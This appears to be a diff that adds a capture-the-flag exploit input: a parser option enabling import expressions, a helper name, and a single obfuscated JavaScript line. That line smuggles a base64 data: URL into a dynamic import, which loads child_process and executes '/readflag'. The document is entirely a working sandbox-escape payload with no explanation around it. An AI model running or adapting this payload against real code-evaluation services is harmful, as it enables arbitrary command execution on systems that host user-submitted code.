@@ -1,0 +1,3 @@
+Enter key value pair ["key","value"]: ["createImportExpressions",true]
+Enter helper method: slice
+Enter JavaScript code (one line): (import(__HELPER__(((class{})+(class {p(){data:text/javascript;base64,aW1wb3J0KCdjaGlsZF9wcm9jZXNzJykudGhlbihtb2Q9PmNvbnNvbGUubG9nKG1vZC5leGVjU3luYygnL3JlYWRmbGFnJykudG9TdHJpbmcoKSkpOzs7}})),(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN)+(NaN!==NaN)+(NaN===NaN),(NaN===NaN)-(NaN!==NaN)-(NaN!==NaN))), undefined)
